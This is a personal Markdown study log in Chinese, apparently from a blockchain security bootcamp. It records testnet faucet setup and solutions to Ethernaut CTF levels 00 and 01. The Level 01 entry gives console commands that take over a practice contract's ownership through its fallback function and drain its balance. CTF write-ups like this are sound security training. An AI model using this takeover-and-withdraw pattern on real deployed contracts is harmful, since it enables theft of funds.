---
timezone: Asia/Shanghai
---


# SpeedX

1. 自我介绍

   [SpeedX](https://x.com/blue5tar) Full Stack Coder, 2016年进入币圈，是一名资深老韭菜。

2. 你认为你会完成本次残酷学习吗？

   善于学习，坚持打卡，我相信会拿到不错的成绩。

## Notes

<!-- Content_START -->

### 2024.08.29

今天开始学习先从 Ethernaut CTF 开始

ETH sepolia 测试网没有多少水，并且 gas 有点高，选择了使用 Arbitrum sepolia

Infura 也支持 Arbitrum sepolia测试网络

**Arbiturm Sepolia 领水地址:** 
* https://www.alchemy.com/faucets/arbitrum-sepolia  可以领取 0.1 ETH, 要求账户 Arbitrum mainnet至少要求0.001 ETH
* https://getblock.io/faucet/arb-sepolia/  可以领取 0.1 ETH, 要求账户 Arbitrum mainnet至少要求0.005 ETH 


每做一个 level 需要点击底部的 Get New Instance 按钮，生成一个新的 contract

在浏览器 Console 使用 **contract** 命令可以查看 Level Instance 合约的 ABI 信息

Level 00 instance contract address: [0x1d9A4D1f60b0C7F4Ae0465955D60DC13a125EA58](https://sepolia-explorer.arbitrum.io/address/0x1d9A4D1f60b0C7F4Ae0465955D60DC13a125EA58)

Level 00 password is "ethernaut0", 使用 await contract.authenticate("ethernaut0") 命令提交，然后点击页面底部的 Submit instance 按钮提交

提交的时候调用的是 ethernaut 合约 [0xD991431D8b033ddCb84dAD257f4821E9d5b38C33](https://sepolia-explorer.arbitrum.io/address/0xD991431D8b033ddCb84dAD257f4821E9d5b38C33)  的**submitLevelInstance** 函数， 传入参数为 Level 00 instance 合约地址 0x1d9A4D1f60b0C7F4Ae0465955D60DC13a125EA58, 猜测逻辑应该是检查 instance 合约的 getCleared() 是否为 true


Level 00 instance 合约代码参见 Writeup [Ethernaut/src/hello.sol](Writeup/SpeedX/src/Ethernaut/hello.sol)



### 2024.08.30
今天做Ethernaut CTF Level 01 Fallback:

要求更改合约 owner 并提取全部的 balance

首先调用 contribute 函数，支付ETH 金额小余 0.001，

```solidity
await contract.contribute({value: toWei("0.0001")})
```

然后，向合约发送 0.0001 ETH 

```solidity
await contract.send(toWei("0.0001"))
```

成交发起交易后， 合约的 owner 被设置为 msg.sender 的地址， 再调用合约的 withdraw 方法取出全部余额

```solidity
await contract.withdraw()
```

至此通关啦！！！

POC: [点这里](Writeup/SpeedX/src/Ethernaut/fallback.sol)

### 2024.08.31

### 2024.09.01

<!-- Content_END -->
